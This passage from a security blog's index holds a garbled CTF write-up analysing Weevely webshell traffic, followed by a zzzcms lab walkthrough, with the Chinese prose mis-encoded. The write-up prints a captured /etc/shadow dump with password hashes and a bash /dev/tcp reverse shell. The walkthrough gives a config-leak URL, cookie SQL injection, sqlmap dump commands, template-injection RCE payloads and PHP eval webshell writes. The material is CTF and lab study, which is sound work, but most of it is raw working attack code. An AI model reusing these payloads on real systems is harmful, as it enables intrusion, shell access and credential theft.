class="string">kbPze6iWSynLVEi5a0b923820dccG6iQqPgZnmhL+q9M/HtmCLUHV7EH4gaLV+JQtAfgePVS48jRBLkECzJkVTU8xD5oEx+pNcR9HWlTBmNDH1EQEzA35rEkVRP/s2hiyyCnQc9o4ZRg7fM2OID/eMI=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5wVFK5L3MT3ENlYLcbSx0deGyvhyi1hVDUyMJZ6HQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6ju8GV98Qhz87yaHagN+eAvJ/It/i1+tPwXOqOEAMnK9RKhJpaXI627DHAku6vIt3+Nlsvv1nIC6RHo50iOxaciNVFZMjTm/gNvZ8OKdLXmCiVQ7MgwXhtarloinKt0OPi1TOy/nmUDKxRQ6KFVU0jcwF3+anvQTAkiTnj6t99CPW0HtqALHPa3L9KfR6kE2KA+oz79Ul6PwETFQ1ZzaEKsMc7OnS2nx2VNcnlL+X0rMmzWd7Bb+W2lCWIX7b/OULvsknpK9UxK5vNN70TgtB+LiFtb7cS0Psxn7P91HmCisVlm64S43v9w94S+ea592n6HOd1wwx8l4RKCLwXDJyer7SWkUsIcMW71pMNmtPyG+hHd7NfNoWHlyB/MCNnKkuR0p9ydyQ==509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5zVJxOL0kuJk6QX03RTR8fQpRggup16Y0EzMyWnLdE509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6iwTB6dG+q2MUFkd7eRxJ8mawBdWpfY8a7PwVSQU1AJUQ/JlK1pqs9r//CsoGz2ZjTw6js4509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5wVFK5L3MT3ENkkX0eSh/YfKuqRejaWYTTchSEx509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6gW83VFkQhztIycI0/8691jViE1QYBT/J+3xKKYHo8jturlEKCDrJ3ODhZPW7cBHeuv+v1WWRFuKJrC2n+ACbuUMv3aJYwmIyaNr5oFdE8sj0Tsp1QRH69/X/LOzE8i9VrUCNptOmXpxD7UXoFtHdQHUKdTLq527SfCE8+J/qK2Xfi+msX9LOHkElwMt4D34zXnkR5RMcbj9BRi04nzsDdGo0BoxziWmY2NJQpSW1vTWGR7ZfZ+h8okgJxyGGEbQN8dGnAn4sXJBGCyP6t65G6YgW6W3jUNJQbmgMEHN7l0jpM+aNOf6VVn8fb4bpcivqfKLPXsX5RWicu3mGCvRP1kfzDFygvOPL4gVe2s+WlTMUc/sHMd4GeYcVt7PCmwkRXtbrMmlNEQ9SheW+/RNsRZMtH4ccSXpnqNiVar/ZqWRviaqmyk2egGW2PbSYGXHbbMj+IVWHtJSEDpXVdu4lAq6q1NcV9k+LsWuQSlb+50mzds4yXG/+xv18pdH3ZfsJ6wBsot/QScP0HkRnhfwnQDApLF509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6hu7f84sxhzNBykZ71wlQglJ3HJe1txaQkH9JCNXBcQLOW46NyaEoLhZ1hTQtoCqE45TeVxGOGTZJGWZXtFyej9PX0vTbDpsr2l6o2y7obzgmNZniS0LvqJZzVpHddkw2RvH8q3VCfc509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hgYTQyMzk=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5wlMz13QPB0uCY/Fe7Ab6wYxj+5973i46WvqRkzB2PY3CtU509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6juLnmZ8QhziJQ2+HdjiCqCt5k1D/iDX+pc8ex0OqLVQvSTyMUF2iZ7/RdCquqhns+avLeEthrYZVfs5lLNhkyE0ZJ5i/PJTaqy/OQKQhLQ0ehYOW/PgNJ3ywJLUkyTaxa0CyZ5u4ZRXj47cMzlZd+NKvhBAFRB/UvVj3dJNbPw9HEL8hb6Mpea3RlV+tNi7XWnVn8mK0SO9/vRrY8HgBX4qAY6+isLpjhB6ZXnXQSI3J0UWM67Mqwr1zBvEK4iRngV9L4PM1njaRc=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6hu7X84sxh3NMyDfl9i9wQlJnHpFvkc5kpfRN3EiqHibe8QrxUa2D48MSvU0EqwAaxPsHkB6t/F3Mw8nu7xL8EJxjmj0mvRuvwC0ht2wDiVjqHXnwKYaeOODfkuCwGl8ktclXksUw509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hgYTQyMzk=509a6f75849b&quot;</span>;</span><br><span class="line"><span class="variable">$phpinput</span> = explode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$phpinput</span>);<span class="comment">// HTTP POST data</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$arrlength</span>=count(<span class="variable">$phpinput</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, <span class="variable">$phpinput</span>[<span class="variable">$x</span>], <span class="variable">$m</span>) == <span class="number">1</span>) &#123; <span class="comment">// if $kh and $kf exist in php://input, store matches in array $m; if debugged with print_r($m) you will notice that $m[0] is $kh + b64data + $kf and $m[1] is b64data only</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$phpcode</span> = @gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)); <span class="comment">// gunzip(XOR(b64decode(data), key))</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$phpcode</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_start(); // Turn on output buffering</span></span><br><span class="line"><span class="comment">    <span class="doctag">@eval</span>($phpcode); // Executes PHP code</span></span><br><span class="line"><span class="comment">    $o = <span class="doctag">@ob</span>_get_contents(); // Save stdout to $o</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_end_clean(); // Clean (erase) the output buffer and turn off output buffering</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    $r = <span class="doctag">@base</span>64_encode(<span class="doctag">@x</span>(<span class="doctag">@gzcompress</span>($o), $k)); // b64encode(XOR(gzip(stdout)), key)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    print(&quot;$p$kh$r$kf&quot;); // HTTP Response data</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>(<span class="number">53368</span>);<span class="number">53368</span>@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;echo 49886&#x27;</span>);<span class="number">49886</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);<span class="keyword">print</span>(@gethostname());simple@error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(is_callable(<span class="string">&#x27;posix_getpwuid&#x27;</span>)&amp;&amp;is_callable(<span class="string">&#x27;posix_geteuid&#x27;</span>))&#123;<span class="variable">$u</span>=@posix_getpwuid(@posix_geteuid());<span class="keyword">if</span>(<span class="variable">$u</span>)&#123;<span class="variable">$u</span>=<span class="variable">$u</span>[<span class="string">&#x27;name&#x27;</span>];&#125;<span class="keyword">else</span>&#123;<span class="variable">$u</span>=getenv(<span class="string">&#x27;username&#x27;</span>);&#125;<span class="keyword">print</span>(<span class="variable">$u</span>);&#125;apache@error_reporting(<span class="number">0</span>);@chdir(<span class="string">&#x27;.&#x27;</span>)&amp;&amp;<span class="keyword">print</span>(@getcwd());/<span class="keyword">var</span>/www/htmlchdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;id 2&gt;&amp;1&#x27;</span>);uid=<span class="number">48</span>(apache) gid=<span class="number">48</span>(apache) groups=<span class="number">48</span>(apache)      </span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;uname -a 2&gt;&amp;1&#x27;</span>);Linux simple <span class="number">3.10</span>.<span class="number">0</span>-<span class="number">693.5</span>.<span class="number">2</span>.el7.x86_64 <span class="comment">#1 SMP Fri Oct 20 20:32:50 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;cat /etc/*relea* 2&gt;&amp;1&#x27;</span>);CentOS Linux release <span class="number">7.4</span>.<span class="number">1708</span> (Core)</span><br><span class="line">Derived <span class="keyword">from</span> Red Hat Enterprise Linux <span class="number">7.4</span> (Source)</span><br><span class="line">NAME=<span class="string">&quot;CentOS Linux&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;7 (Core)&quot;</span></span><br><span class="line">ID=<span class="string">&quot;centos&quot;</span></span><br><span class="line">ID_LIKE=<span class="string">&quot;rhel fedora&quot;</span></span><br><span class="line">VERSION_ID=<span class="string">&quot;7&quot;</span></span><br><span class="line">PRETTY_NAME=<span class="string">&quot;CentOS Linux 7 (Core)&quot;</span></span><br><span class="line">ANSI_COLOR=<span class="string">&quot;0;31&quot;</span></span><br><span class="line">CPE_NAME=<span class="string">&quot;cpe:/o:centos:centos:7&quot;</span></span><br><span class="line">HOME_URL=<span class="string">&quot;https://www.centos.org/&quot;</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">&quot;https://bugs.centos.org/&quot;</span></span><br><span class="line"></span><br><span class="line">CENTOS_MANTISBT_PROJECT=<span class="string">&quot;CentOS-7&quot;</span></span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=<span class="string">&quot;7&quot;</span></span><br><span class="line">REDHAT_SUPPORT_PRODUCT=<span class="string">&quot;centos&quot;</span></span><br><span class="line">REDHAT_SUPPORT_PRODUCT_VERSION=<span class="string">&quot;7&quot;</span></span><br><span class="line"></span><br><span class="line">CentOS Linux release <span class="number">7.4</span>.<span class="number">1708</span> (Core)</span><br><span class="line">CentOS Linux release <span class="number">7.4</span>.<span class="number">1708</span> (Core)</span><br><span class="line">cpe:/o:centos:centos:<span class="number">7</span></span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;ls -l /etc/shadow 2&gt;&amp;1&#x27;</span>);-rwxr--r-- <span class="number">1</span> root root <span class="number">912</span> Dec  <span class="number">4</span> <span class="number">15</span>:<span class="number">31</span> /etc/shadow</span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;cat /etc/shadow 2&gt;&amp;1&#x27;</span>);root:$<span class="number">6</span><span class="variable">$yxsi</span>.<span class="number">1</span>Ma<span class="variable">$OZVDHL1S8Uq34AaBRURsdSu</span>/o/i4S4tZ66A08k3yMuEYehGn8zpwpMJIS59t.dqdKjj22KakQNwbuIjQc5JV20:<span class="number">18234</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">bin:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">daemon:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">adm:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lp:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sync:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">shutdown:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">halt:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">mail:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">operator:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">games:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">ftp:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">nobody:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">avahi-autoipd:!!:<span class="number">17483</span>::::::</span><br><span class="line">dbus:!!:<span class="number">17483</span>::::::</span><br><span class="line">polkitd:!!:<span class="number">17483</span>::::::</span><br><span class="line">tss:!!:<span class="number">17483</span>::::::</span><br><span class="line">postfix:!!:<span class="number">17483</span>::::::</span><br><span class="line">sshd:!!:<span class="number">17483</span>::::::</span><br><span class="line">simple:$<span class="number">6</span><span class="variable">$OKhnPP</span>.<span class="number">6</span>XfWK/Qjk$<span class="number">701</span>eOD87cni/<span class="number">1</span>IShASWs1nkLOOWWZdZZTflk6cw3fBdZwffib4aEYfUoUhDGZ9KJGQc64sJk8XptdK1zVeVmC1:<span class="number">17483</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-network:!!:<span class="number">17483</span>::::::</span><br><span class="line">geoclue:!!:<span class="number">17483</span>::::::</span><br><span class="line">rtkit:!!:<span class="number">17483</span>::::::</span><br><span class="line">colord:!!:<span class="number">17483</span>::::::</span><br><span class="line">pulse:!!:<span class="number">17483</span>::::::</span><br><span class="line">gdm:!!:<span class="number">17483</span>::::::</span><br><span class="line">chrony:!!:<span class="number">17483</span>::::::</span><br><span class="line">mysql:!!:<span class="number">17946</span>::::::</span><br><span class="line">apache:!!:<span class="number">17946</span>::::::</span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;/bin/bash -i &gt;&amp;/dev/tcp/192.16.12.140/1234 0&gt;&amp;1 2&gt;&amp;1&#x27;</span>);chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;ping -c 2 192.168.12.140 2&gt;&amp;1&#x27;</span>);PING <span class="number">192.168</span>.<span class="number">12.140</span> (<span class="number">192.168</span>.<span class="number">12.140</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">12.140</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.746</span> ms</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">12.140</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">64</span> time=<span class="number">1.07</span> ms</span><br><span class="line"></span><br><span class="line">--- <span class="number">192.168</span>.<span class="number">12.140</span> ping statistics ---</span><br><span class="line"><span class="number">2</span> packets transmitted, <span class="number">2</span> received, <span class="number">0</span>% packet loss, time <span class="number">1000</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">0.746</span>/<span class="number">0.911</span>/<span class="number">1.076</span>/<span class="number">0.165</span> ms</span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;bash -i &gt;&amp;/dev/tcp/192.168.12.140/1234 0&gt;&amp;1 2&gt;&amp;1&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯èƒ½æœ‰ç‚¹ä¹±ï¼Œä¸è¿‡ä¸å½±å“äº†åº”è¯¥ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„å†…å®¹äº†</p><p>è¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ªåå¼¹äº†shellï¼Œbash -i &gt;&amp;/dev/tcp/192.168.12.140/1234 0&gt;&amp;1 2&gt;&amp;1</p><p>è´¦å·å¯†ç çš„è¯ï¼Œå¯ä»¥johnçˆ†ç ´ï¼Œå¾ˆç®€å•ï¼Œåœ¨kaliä¸Šæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶å ç›´æ¥john a.txtå³å¯</p><p><img src="/images/tiesan/image-20230505204836260.png" alt="image-20230505204836260"></p><p><img src="/images/tiesan/image-20230505205041689.png" alt="image-20230505205041689"></p><p>è·‘äº†å¾ˆä¹…ï¼Œsimpleçš„å¯†ç æ²¡æœ‰è·‘å‡ºæ¥ï¼Œrootå¯†ç ä¸º123456ã€‚</p><p>åˆ°è¿™é‡Œæ‰€æœ‰çš„ä¿¡æ¯å°±éƒ½çŸ¥é“äº†ã€‚</p><p>å¦‚æœæ‰“åŒ…é¢˜ç›®çš„å¸ˆå‚…ï¼Œå¯ä»¥ç•™è¨€ã€‚æˆ‘å¿˜è®°æ‰“åŒ…æ•´ç«™ç›®å½•äº†ã€‚</p><h4 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> æµé‡åˆ†æ </tag>
            
            <tag> ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ› </tag>
            
            <tag> é•¿åŸæ¯ </tag>
            
            <tag> weevelyåˆ†æ </tag>
            
            <tag> æº¯æºå–è¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lab8-wp</title>
      <link href="/2023/04/14/lab8-wp/"/>
      <url>/2023/04/14/lab8-wp/</url>
      
        <content type="html"><![CDATA[<p><img src="D:\myBlog\images\lab8-wp\image-20250414181411520.png" alt="image-20250414181411520"></p><p><img src="D:\myBlog\images\lab8-wp\image-20250414183248548.png" alt="image-20250414183248548"></p><p>ç¬¬ä¸€å¤©å¼€ç¯å¢ƒçš„æ—¶å€™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œå¼€å®Œç¯å¢ƒï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œæœæ–­ä¸€ä¸‹åˆ†é…çš„ipçš„ç«¯å£ï¼Œæ‰«åˆ°ä¸¤ä¸ªï¼Œç›´æ¥ä¸‰æ¿æ–§æ— æœã€‚</p><p>ç¬¬äºŒå¤©åˆå»å¼€ç¯å¢ƒï¼Œå¼€å®Œæœ‰ä¸ªcmsï¼Œæˆ‘å‹’ä¸ªè±†ï¼Œæ„Ÿæƒ…æ˜¨å¤©æ‰«äº†ä¿©å°æ—¶ï¼Œæ‰“æ­ªäº†ã€‚</p><p>å¼€å±€ä¸€ä¸ªzzzcms</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415163502978.png" alt="image-20250415163502978"></p><p>å¼€å§‹æœç´¢zzzcmså†å²æ¼æ´ï¼Œçœ‹äº†å‡ ä¸ªæ–‡ç« ï¼Œå‘ç°å¾ˆä¹±ï¼Œä¸çŸ¥é“å“ªä¸ªå¯ä»¥ã€‚å…ˆæ‰¾ç®€å•çš„è¯•ä¸€ä¸‹ã€‚</p><p>é¦–å…ˆè‚¯å®šæ˜¯å¼±å£ä»¤ï¼Œè¯•äº†å‡ ä¸ªæ— æœï¼Œæ‰¾ä¸ªæ–‡ç« </p><p><a href="https://www.cnblogs.com/0daybug/p/12565986.html%EF%BC%8C">https://www.cnblogs.com/0daybug/p/12565986.htmlï¼Œ</a></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415163743170.png" alt="image-20250415163743170"></p><p>æ³„éœ²config.phpï¼Œ<code>/admin/?module=templateedit&amp;type=/config/zzz_config.php</code></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415163853515.png" alt="image-20250415163853515"></p><p>æœ‰æ•°æ®åº“è´¦å·å¯†ç ï¼Œ</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415163912333.png" alt="image-20250415163912333"></p><p>æ‹¿å»è¿ä¸‹ï¼Œå‘ç°ä¸è¡Œï¼Œåšäº†é™åˆ¶ï¼Œä¸å…è®¸çš„ipã€‚è¿™é‡Œä¹Ÿè¯•äº†ä¸€ä¸‹ï¼Œä¸æ˜¯adminçš„å¯†ç ã€‚é‚£å°±åªèƒ½æ¢æ€è·¯äº†ã€‚</p><p>åˆçœ‹åˆ°ä¸€ç¯‡å¤§ä½¬æ–‡ç« ï¼Œ<a href="https://www.laitimes.com/article/2t711_38slf.html%EF%BC%8C%E8%AF%B4%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%9E%9C%E6%96%AD%E8%AF%95%E4%B8%80%E4%B8%8B%E3%80%82">https://www.laitimes.com/article/2t711_38slf.htmlï¼Œè¯´å­˜åœ¨æ³¨å…¥ï¼Œæœæ–­è¯•ä¸€ä¸‹ã€‚</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /search/ HTTP/1.1</span><br><span class="line">Host: 172.50.12.33</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=5ij67devm1pd3ssb93g4um3fs4; zzz_adminpass=1;zzz_keys=0*</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>bpè¯•ä¸€ä¸‹</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164243491.png" alt="image-20250415164243491"></p><p>æ—¶é—´æ˜¯è®¾ç½®çš„äºŒå€</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164142426.png" alt="image-20250415164142426"></p><p>sqlmapç›´æ¥è·‘ï¼Œ<code>python3 .\sqlmap.py -r C:\Users\xin\Desktop\gggggg.txt --risk 3 --level 3 -D zzzcms -T zzz_u ser --dump</code></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164658134.png" alt="image-20250415164658134"></p><p>admin,84c45962d887564f</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164730911.png" alt="image-20250415164730911"></p><p>è¿™ç§ç›´æ¥å»ç™¾åº¦æœå°±è¡Œï¼Œ</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164749973.png" alt="image-20250415164749973"></p><p>admin,admin123456</p><p>åˆ°è¿™ï¼Œæˆ‘ä»¬å¯ä»¥ç™»å½•äº†ï¼Œç›¸ä¿¡å¤§å®¶å·²ç»çœ‹äº†ä¸€äº›æ–‡ç« è¯´ï¼Œadminçš„ç›®å½•æ˜¯admin+ä¸‰ä½å­—ç¬¦ï¼Œè¿™é‡Œé¶æœºç¯å¢ƒä¸æ˜¯ï¼Œå°±æ˜¯adminã€‚<code>http://172.50.12.33/plugins/webuploader/js/webconfig.php</code></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164950751.png" alt="image-20250415164950751"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œè¿˜å¾—æˆ‘è¿˜è·‘äº†ä¸€åœˆï¼Œæ²¡è·‘åˆ°ã€‚</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415165042550.png" alt="image-20250415165042550"></p><p>æ¥ä¸‹æ¥å°±æ˜¯åå°äº†</p><p>æ ¹æ®è¿™ç¯‡æ–‡ç« ï¼Œ<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Zzzcms/Zzzcms%201.61%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Zzzcms/Zzzcms%201.61%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p><p>è¿›è¡Œåå°rceï¼Œ</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415170042733.png" alt="image-20250415170042733"></p><p>ç™»å½•è¿›æ¥ï¼Œç‚¹ä¸Šé¢æ¨¡æ¿ç®¡ç†ï¼Œæœ¬åœ°æ¨¡æ¿ï¼Œæ‰¾åˆ°ç”µè„‘çš„ï¼Œæ‰¾åˆ°search.htmlï¼Œåé¢åŠ ä¸€å¥ã€‚</p><p><code>&#123;if:assert($_request[phpinfo()])&#125;phpinfo();eva1($_POST[&#39;a&#39;]);&#123;end if&#125;</code></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415170158388.png" alt="image-20250415170158388"></p><p><a href="http://172.50.12.33/search/%EF%BC%8C%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AFhttp://172.50.12.33/search/index.php">http://172.50.12.33/search/ï¼Œå…¶å®å°±æ˜¯http://172.50.12.33/search/index.php</a></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415170226485.png" alt="image-20250415170226485"></p><p><code>&#123;if:assert($_POST[x])&#125;phpinfo();&#123;end if&#125;</code></p><p><img src="D:\myBlog\images\lab8-wp\image-20250416092837347.png" alt="image-20250416092837347"></p><p>è¿™æ ·çš„è¯å°±è¿ä¸Šæ¥äº†ã€‚</p><p><img src="D:\myBlog\images\lab8-wp\image-20250416092820755.png" alt="image-20250416092820755"></p><p>gears</p><p>python3 .\sqlmap.py -u â€œ<a href="http://172.10.59.35/moduleinterface.php?mact=News,m_,default,0&amp;m_idlist=a,b,c,1,2,3))*&quot;">http://172.10.59.35/moduleinterface.php?mact=News,m_,default,0&amp;m_idlist=a,b,c,1,2,3))*&quot;</a> â€“batch â€“level 5 â€“risk 3</p><p>pt-1</p><p><a href="http://10.0.0.68/cslab/admin_notify.php">http://10.0.0.68/cslab/admin_notify.php</a></p><p>cslab cslab </p><p>notify1=1â€;eval($_POST[a]);phpinfo();highlight_file(<strong>FILE</strong>);//&amp;notify2=2&amp;notify3=3</p><p><code>a=system(&#39;echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt; ./shell.txt&#39;);</code></p><p>a=copy(â€˜shell.txtâ€™,â€™a.phpâ€™);</p><p>windows/x64/meterpreter/bind_tcp</p><p><img src="D:\myBlog\images\lab8-wp\image-20250428175114712.png" alt="image-20250428175114712"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /message/index.html HTTP/1.1</span><br><span class="line">Host: 192.168.111.200</span><br><span class="line">Content-Length: 45</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://192.168.111.200</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.111.200/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=r1ttlpnb1h9aib0fnd8raq3fgj</span><br><span class="line">cdn-src-ip: 2&#x27; and 